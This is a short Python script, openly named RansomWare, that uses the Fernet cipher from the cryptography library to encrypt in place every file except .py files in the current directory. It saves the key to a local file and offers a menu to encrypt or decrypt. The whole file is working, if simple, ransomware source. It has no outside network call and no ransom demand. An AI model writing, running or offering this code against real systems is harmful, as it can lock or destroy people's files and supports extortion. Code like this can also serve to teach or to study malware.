import os
from cryptography.fernet import Fernet

class RansomWare:
    def __init__(self):
        self.files = self.get_files()
        
    def get_files(self):
        files = []
        for file in os.listdir():
            if os.path.isfile(file) and not file.endswith(".py") and not file == "generatedKey.key":
                files.append(file)
        return files

    def generate_key(self):
        self.key = Fernet.generate_key()

        with open("generatedKey.key","wb") as new_key:
            new_key.write(self.key)

    def read_key(self):
        with open("generatedKey.key","rb") as new_key:
            self.key = new_key.read()

    def encrypt_files(cls):
        cls.generate_key()
        for file in cls.files:
            with open(file,"rb") as f:
                content = f.read()
            encryption = Fernet(cls.key).encrypt(content)

            with open(file,"wb") as f:
                f.write(encryption)

    def decrypt_files(cls):
        cls.read_key()
        for file in cls.files:
            with open(file,"rb") as f:
                content = f.read()
            decryption = Fernet(cls.key).decrypt(content)

            with open(file,"wb") as f:
                f.write(decryption)

if __name__ == "__main__":
    choise = input("1-) Decrypt files\n2-) Encrypt files\n-->  ")
    ransomware = RansomWare()

    #match can be used on python >= 3.10
    match(choise):
        case "1":
            ransomware.decrypt_files()
        case "2":
            ransomware.encrypt_files()
        case _:
            print("Option not found")